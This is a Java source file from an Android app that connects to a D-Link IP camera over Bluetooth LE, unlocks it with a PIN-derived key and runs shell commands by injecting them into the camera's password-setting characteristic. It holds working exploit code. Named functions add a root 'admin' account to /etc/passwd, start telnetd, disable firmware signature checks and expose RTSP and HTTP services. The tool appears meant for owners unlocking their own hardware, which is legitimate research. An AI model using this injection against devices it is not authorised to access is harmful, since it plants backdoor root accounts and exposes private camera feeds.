/*
 *  SPDX-License-Identifier: GPL-3.0-only
 *  Copyright (c) 2019  Bjørn Mork <bjorn@mork.no>
 */

package no.mork.android.defogger;

import android.app.Activity;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothGatt;
import android.bluetooth.BluetoothGattCallback;
import android.bluetooth.BluetoothGattCharacteristic;
import android.bluetooth.BluetoothGattDescriptor;
import android.bluetooth.BluetoothGattService;
import android.bluetooth.BluetoothManager;
import android.bluetooth.BluetoothProfile;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.text.format.DateFormat;
import android.util.Base64;
import android.util.Log;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.inputmethod.EditorInfo;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.TextView.OnEditorActionListener;
import android.widget.Toast;

import java.lang.StringBuilder;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Date;
import java.util.ArrayDeque;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

public class IpCamActivity extends Activity {
    private static String msg = "Defogger IPCamActivity: ";

    private static final int REQUEST_GET_NETWORK  = 0x10;

    private BluetoothGatt mGatt;
    private BluetoothGattService ipcamService;
    private BluetoothDevice device;
    private String pincode;
    private ArrayDeque<BluetoothGattCharacteristic> readQ;
    private ArrayDeque<BluetoothGattCharacteristic> writeQ;
    private ArrayDeque<String> commandQ;

    // status
    private boolean connected = false;
    private boolean locked = true;
    private boolean wifilink = false;

    private String[] networks;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
	Log.d(msg, "onCreate()");
	super.onCreate(savedInstanceState);
	setContentView(R.layout.activity_ipcam);

	// Get the Intent that started this activity and extract parameters
	Intent intent = getIntent();
	pincode = intent.getStringExtra("pincode");
	Bundle b = intent.getExtras();
	if (b == null) // when can this happen? Answer: If we crashed and are restarted by the system....
	    Log.e(msg, "Caller failed to provide us with a Bluetooth device - all actions will fail (pincode is " + pincode + ")");
	else
	    device = b.getParcelable("btdevice");

	EditText cmd = (EditText) findViewById(R.id.command);
	cmd.setOnEditorActionListener(new OnEditorActionListener() {
		@Override
		public boolean onEditorAction(TextView v, int actionId, KeyEvent event) {
		    if (actionId == EditorInfo.IME_ACTION_DONE) {
			runCommand(v.getText().toString());
			v.setText("");
			return true;
		    }
		    return false;
		}

	    });
    }

    @Override
    protected void onResume() {
	Log.d(msg, "onResume()");
        super.onResume();
	connectDevice(device);
    }

    @Override
    protected void onPause() {
	Log.d(msg, "onPause()");
        super.onPause();
    }

    @Override
    protected void onStop() {
	Log.d(msg, "onStop()");
        super.onStop();
    }

    @Override
    protected void onDestroy() {
	Log.d(msg, "onDestroy()");
        super.onDestroy();
    }

    @Override
    public void onSaveInstanceState(Bundle savedInstanceState) {
	Log.d(msg, "onSaveInstanceState()");

	// Save the user's current game state
	savedInstanceState.putString("pincode", pincode);
	savedInstanceState.putParcelable("btdevice", device);

	// Always call the superclass so it can save the view hierarchy state
	super.onSaveInstanceState(savedInstanceState);
    }

    
    public void onRestoreInstanceState(Bundle savedInstanceState) {
	Log.d(msg, "onRestoreInstanceState()");
	// Always call the superclass so it can restore the view hierarchy
	super.onRestoreInstanceState(savedInstanceState);

	// Restore state members from saved instance
	pincode = savedInstanceState.getString("pincode");
	device = savedInstanceState.getParcelable("btdevice");
    }

    @Override
    protected void onActivityResult(int req, int res, Intent intent) {
        super.onActivityResult(req, res, intent);
	Log.d(msg, "activity returned result");
	switch (req) {
	case REQUEST_GET_NETWORK:
	    if (res == RESULT_OK)
		handleConfigureNetworkResult(intent.getStringExtra("netconf"));
	    else
		setStatus("Network configuration was cancelled");
	    break;
	default:
	    Log.d(msg, "unknown activity result returned???");
	}
    }

    /* offload network selection and password input to another activity */
    public void startConfigureNetworkActivity(String[] networks) {
	Intent intent = new Intent(this, ConfigureNetworkActivity.class);
	intent.putExtra("networks", networks);
	startActivityForResult(intent, REQUEST_GET_NETWORK);
    }

   
    // GATT callbacks
    private class GattClientCallback extends BluetoothGattCallback {
	private String multimsg;

	public void onConnectionStateChange(BluetoothGatt gatt, int status, int newState) {
	    Log.d(msg, "onConnectionStateChange() status = " + status + ", newState = " + newState);
	    if (status == BluetoothGatt.GATT_SUCCESS && newState == BluetoothProfile.STATE_CONNECTED) {
		setStatus("Connected to " + gatt.getDevice().getName());
		connected = true;
		if (!gatt.discoverServices())
		    setStatus("Falied to start service discovery");
	    } else {		
		disconnectDevice("Connection to " + gatt.getDevice().getName() + " failed");
	    }
	}
	
	public void onServicesDiscovered(BluetoothGatt gatt, int status) {
	    Log.d(msg, "onServicesDiscovered()");
	    
	    if (status != BluetoothGatt.GATT_SUCCESS) {
		disconnectDevice("Failed to discover services on " + gatt.getDevice().getName());
		return;
	    }
	    // get the IPCam service
	    //	    ipcamService = gatt.getService(UUID.fromString("0000d001-0000-1000-8000-00805f9b34fb"));
	    ipcamService = gatt.getService(Util.UUIDfromInt(0xd001));
	    if (ipcamService == null) {
		disconnectDevice(gatt.getDevice().getName() + " does not support the IPCam GATT service");
		return;
		
	    }

	    setStatus("IPcam GATT service found");
	    notifications(true);
	}

	public void onCharacteristicRead (BluetoothGatt gatt, BluetoothGattCharacteristic c, int status) {
	    int code = (int)(c.getUuid().getMostSignificantBits() >> 32);
	    String val = c.getStringValue(0);
	    Map<String,String> kv = Util.splitKV(val, ";");

	    Log.d(msg, c.getUuid().toString() + " returned " + val);
	    
	    switch (code) {
	    case 0xa001: // challenge
		// already unlocked? 
		if (kv.get("M").equals("0")) {
		    setLocked(false);
		    break;
		}

		setStatus("Unlocking " + gatt.getDevice().getName() + " usin pincode " + pincode);
		String key = Util.calculateKey(gatt.getDevice().getName() + pincode + kv.get("C"));
		doUnlock(key);
		break;
	    case 0xa100:
		// starting a new sequence?
		if (kv.get("P").equals("1"))
		    multimsg = "";
		multimsg += val.split(";",3)[2];
		// repeat until result is complete
		if (!kv.get("N").equals(kv.get("P")))
		    readChar(0xa100);
		else
		    networks = multimsg.split("&");
		break;
	    case 0xa101: // wificonfig
		displayWifiConfig(kv);
		break;
	    case 0xa103: // wifilink
		wifilink = kv.get("S").equals("1");
		// refresh IP config if link changed to up
		if (wifilink)
		    readChar(0xa104);
		break;
	    case 0xa104: // ipconfig
		displayIpConfig(kv);
		break;
	    case 0xa200: // sysinfo
		displaySysInfo(kv);
		break;
	    default:
		Log.d(msg, "Read unhandled characteristic: " + c.getUuid().toString());
	    }

	    runQueues();
	}
	
	public void onCharacteristicChanged(BluetoothGatt gatt, BluetoothGattCharacteristic c) {
	    Map<String,String> kv = Util.splitKV(c.getStringValue(0), ";");
	    Log.d(msg, String.format("UUID %#06x mode=", Integer.parseInt(kv.get("C"))) + kv.get("A") + " state=" + kv.get("R"));
	}

	public void onCharacteristicWrite (BluetoothGatt gatt, BluetoothGattCharacteristic c, int status) {
	    int code = (int)(c.getUuid().getMostSignificantBits() >> 32);
	    String val = c.getStringValue(0);
	    Map<String,String> kv = Util.splitKV(val, ";");
	    
	    Log.d(msg, "Write to " + c.getUuid().toString() + " status=" + status + ", value is now: " + val);
	    
	    switch (code) {
	    case 0xa001:
		if (kv.get("M").equals("0"))
		    setLocked(false);
		else
		    setStatus("Unlocking failed - Wrong PIN Code?");
		break;
	    case 0xa201:
		runCommandQueue(val);
		break;
	    default:
		Log.d(msg, "No action defined after writing " + c.getUuid().toString());
	    }
	    runQueues();
	}


	public void onDescriptorWrite (BluetoothGatt gatt,  BluetoothGattDescriptor d, int status) {
	    Log.d(msg, d.getUuid().toString() + " status: " + status);
	    int code = (int)(d.getUuid().getMostSignificantBits() >> 32);

	    switch (code) {
	    case 0x2902:
		/* now, unlock */
		if (java.util.Arrays.equals(d.getValue(), BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE))
		    getLock();
		break;
	    default:
		Log.d(msg, "unknown descriptor written");
	    }
	}
    }
    
    private void setStatus(String text) {
	Log.d(msg, "Status: " + text);
	runOnUiThread(new Runnable() {
		@Override
		public void run() {
		    TextView status = (TextView) findViewById(R.id.statustext);
		    status.setText(text);
		}
	    });
    }

/*
05-31 21:26:58.866 26309 26345 D Defogger MainActivity: : 0000a104-0000-1000-8000-00805f9b34fb returned I=192.168.2.37;N=255.255.255.0;G=192.168.2.1;D=148.122.16.253
05-31 21:27:13.761 26309 26345 D Defogger MainActivity: : 0000a200-0000-1000-8000-00805f9b34fb returned N=DCS-8000LH;P=1;T=1559330833;Z=UTC;F=2.02.02;H=A1;M=B0C5544CCC73;V=0.02
05-31 21:27:18.618 26309 26345 D Defogger MainActivity: : 0000a103-0000-1000-8000-00805f9b34fb returned S=1
*/
    
    private void displayWifiConfig(Map<String,String> kv) {
	Log.d(msg, "displayWifiConfig()");
	runOnUiThread(new Runnable() {
		@Override
		public void run() {
		    TextView t = (TextView) findViewById(R.id.wifistatus);
		    if (kv.get("I").length() > 0)
			t.setText((wifilink ? "Connected" : "Not connected") + " to '" + kv.get("I") + "' with M=" + kv.get("M") + ", S=" + kv.get("S") + ", E=" + kv.get("E"));
		    else
			t.setText("WiFi connection is unconfigured");
		}
	    });
    }

    private void displayIpConfig(Map<String,String> kv) {
	Log.d(msg, "displayIpConfig()");
	runOnUiThread(new Runnable() {
		@Override
		public void run() {
		    TextView t = (TextView) findViewById(R.id.ipstatus);
		    if (wifilink && kv.get("I").length() > 0)
			t.setText("IP Address: " + kv.get("I") + "\nNetmask: " + kv.get("N") + "\nGateway: " + kv.get("G") + "\nDNS: " + kv.get("D"));
		    else
			t.setText("No IP Configured");
		}
	    });
    }

    private void displaySysInfo(Map<String,String> kv) {
	Log.d(msg, "displaySysInfo()");
	java.text.DateFormat dateFormat = android.text.format.DateFormat.getTimeFormat(getApplicationContext());
	
	runOnUiThread(new Runnable() {
		@Override
		public void run() {
		    TextView t = (TextView) findViewById(R.id.sysstatus);
		    t.setText("Name: " + kv.get("N") + "\nTime: " + kv.get("T") + "\nFW Ver: " + kv.get("F") + "\nHW Ver: " + kv.get("H") + "\nMyDlink Ver: " + kv.get("V") + "\nMac: " + kv.get("M"));
		    //		    t.setText(dateFormat.format(new Date(1000 * Integer.parseInt(kv.get("T"))))); // milliseconds....
		}
	    });
    }

    private void connectDevice(BluetoothDevice device) {
	if (device == null || connected)
	    return;
	Log.d(msg, "connectDevice() " + device.getAddress());

	// create queues
	readQ = new ArrayDeque();
	writeQ = new ArrayDeque();
	commandQ = new ArrayDeque();

	// reset status to default
	connected = false;
	locked = true;
	wifilink = false;
	
	setStatus("Connecting to '" + device.getName() + "' (" + device.getAddress() + ")");
	GattClientCallback gattClientCallback = new GattClientCallback();
        mGatt = device.connectGatt(this, true, gattClientCallback);
    }

    private void disconnectDevice(String reason) {
	// we're finishing, so we either havt to return the reason to the parent or flash it like this
	runOnUiThread(new Runnable() {
		public void run() {
		    Toast.makeText(getApplicationContext(), reason, Toast.LENGTH_LONG).show();
		}});

	// reset status to default
	connected = false;
	locked = true;
	wifilink = false;

	if (mGatt != null)
	    mGatt.close();
	Log.d(msg, "disconnectDevice() with reason: " + reason);
       	finish();
    }

    private void getCurrentConfig() {
	View v = new View(this);
	getWifiLink(v);
	getWifiConfig(v);
	getSysInfo(v);
	doWifiScan(v);
    }

    // camera specific code
    private void setLocked(boolean lock) {
	if (lock == locked)
	    return;
	locked = lock;
 	setStatus(mGatt.getDevice().getName() + " is " + (lock ? "locked" : "unlocked"));

	/* autocollect current config after unlocking */
	if (!locked)
	    getCurrentConfig();
   }

    private void notifications(boolean enable) {
	if (!connected || !enable)
	    return;
	Log.d(msg, "notifications()");
	BluetoothGattCharacteristic c = ipcamService.getCharacteristic(Util.UUIDfromInt(0xa000));
	if (!mGatt.setCharacteristicNotification(c, enable))
	    Log.d(msg, "failed to enable notifications");

	/*
	 * actually enabling notifications is more complicated than necessary... 
	 * ref: https://stackoverflow.com/questions/27068673/subscribe-to-a-ble-gatt-notification-android
	 * 0x2902 org.bluetooth.descriptor.gatt.client_characteristic_configuration.xml
	 */
	BluetoothGattDescriptor descriptor = c.getDescriptor(Util.UUIDfromInt(0x2902));
	descriptor.setValue(enable ? BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE : BluetoothGattDescriptor.DISABLE_NOTIFICATION_VALUE);
	mGatt.writeDescriptor(descriptor);
    }
    
    private void getLock() {
	if (!locked) {
	    Log.d(msg, "getLock() already unlocked");
	    return;
	}
	BluetoothGattCharacteristic c = ipcamService.getCharacteristic(Util.UUIDfromInt(0xa001));
	mGatt.readCharacteristic(c);
    }

    private void doUnlock(String key) {
	if (!connected)
	    return;
	Log.d(msg, "doUnlock(), key is " + key);
	BluetoothGattCharacteristic c = ipcamService.getCharacteristic(Util.UUIDfromInt(0xa001));
	c.setValue("M=0;K=" + key); 
	mGatt.writeCharacteristic(c);
    }

    private BluetoothGattCharacteristic runQueues() {
	BluetoothGattCharacteristic c = readQ.peekFirst();
	if (c != null && mGatt.readCharacteristic(c))
	    return readQ.removeFirst();
	c = writeQ.peekFirst();
	if (c != null && mGatt.writeCharacteristic(c))
	    return writeQ.removeFirst();
	return null;
    }

    private void readChar(int num) {
	if (!connected)
	    return;
	BluetoothGattCharacteristic c = ipcamService.getCharacteristic(Util.UUIDfromInt(num));
 	if (locked) {
	    Log.d(msg, "camera is locked");
	    readQ.offer(c);
	    return;
	}

	Log.d(msg, "reading " + String.format("%#06x", num));
	if (!mGatt.readCharacteristic(c))
	    readQ.offer(c);
    }

    private void writeChar(int num, String val) {
	if (!connected)
	    return;
	BluetoothGattCharacteristic c = ipcamService.getCharacteristic(Util.UUIDfromInt(num));
	c.setValue(val);
 	if (locked) {
	    Log.d(msg, "camera is locked");
	    writeQ.offer(c);
 	    return;
	}
	Log.d(msg, "writing '" + val + "' to " + String.format("%#06x", num));
	if (!mGatt.writeCharacteristic(c))
	    writeQ.offer(c);
    }

    /* WiFi scan is required for network configuration */
    public void doWifiScan(View view) {
	readChar(0xa100);
    }

    public void doWifiConfig(View view) {
	startConfigureNetworkActivity(networks);
    }

    public void getWifiConfig(View view) {
	readChar(0xa101);
    }

    public void getWifiLink(View view) {
	readChar(0xa103);
    }

    public void getSysInfo(View view) {
	readChar(0xa200);
    }

    public void doCommand(View view) {
    	EditText cmd = (EditText) findViewById(R.id.command);
	runCommand(cmd.getText().toString());
	cmd.setText("");
    }

    public void doRtsp(View view) {
	runCommand("[ \"$(tdb get RTPServer RejectExtIP_byte)\" -eq \"0\" ]||tdb set RTPServer RejectExtIP_byte=0");
        runCommand("[ \"$(tdb get RTPServer Authenticate_byte)\" -eq \"1\" ]||tdb set RTPServer Authenticate_byte=1");
        runCommand("/etc/rc.d/init.d/firewall.sh reload&&/etc/rc.d/init.d/rtspd.sh restart");
    }

    public void doTelnet(View view) {
	runCommand("grep -Eq ^admin: /etc/passwd||echo admin:x:0:0::/:/bin/sh >>/etc/passwd");
	runCommand("grep -Eq ^admin:x: /etc/passwd&&echo admin:" + pincode + "|chpasswd");
        runCommand("pidof telnetd||telnetd");
    }

    public void doHttp(View view) {
        runCommand("[ \"$(tdb get HTTPServer Enable_byte)\" -eq \"1\" ]||tdb set HTTPServer Enable_byte=1");
        runCommand("/etc/rc.d/init.d/extra_lighttpd.sh start");
    }

    public void doUnsignedFW(View view) {
	runCommand("tdb set SecureFW _TrustLevel_byte=0");
    }
   
    private void handleConfigureNetworkResult(String netconf) {
	/* Validate result from ConfigureNetwork activity */
	if (netconf == null) {
	    setStatus("Network configuration was cancelled");
	    return;
	}

	/* sanity check result */
	Map<String,String> kv = Util.splitKV(netconf, ";");
	if (!kv.containsKey("M") || !kv.containsKey("I") || !kv.containsKey("S") || !kv.containsKey("E") || !kv.containsKey("K"))  {
	    setStatus("Network configuration failure - data missing");
	    return;
	}

	Log.d(msg, "Would configure: " + netconf);
	/* OK, go */
	//	writeChar(0xa101, netconf); // configure wifi
	//	writeChar(0xa102, "C=1");   // connect

	/* refresh current settings for display */
	getCurrentConfig();
    }

    /* does this work? */
    private void setInitialPassword() {
	queuedSetPassword("P=;N=" + pincode);
    }

    /*
     * writing a series of values to this characteristic is not the
     * same as writing the last value only, which is how a
     * characteristic normally would behave.  So we maintain a dedicated
     * write queue here.
     */
    private void queuedSetPassword(String val) {
	boolean writenow = commandQ.isEmpty();
	commandQ.add(val);
	if (writenow)
	    writeChar(0xa201, val);
    }
    
    private void runCommand(String command) {
	setStatus("Running '" + command + "' on camera...");
	queuedSetPassword("P=" + pincode + ";N=" + pincode + "&&(" + command + ")&");
    }


    private void runCommandQueue(String lastwrite) {
	String first = commandQ.remove();
	if (first.equals(lastwrite))
	    Log.d(msg, "Command '" + lastwrite + "' was successfully written");
	else
	    Log.d(msg, "'" + lastwrite + "' does not match expected: '" + first+ "'");
	if (!commandQ.isEmpty())
	    writeChar(0xa201, commandQ.peekFirst());
    }
}
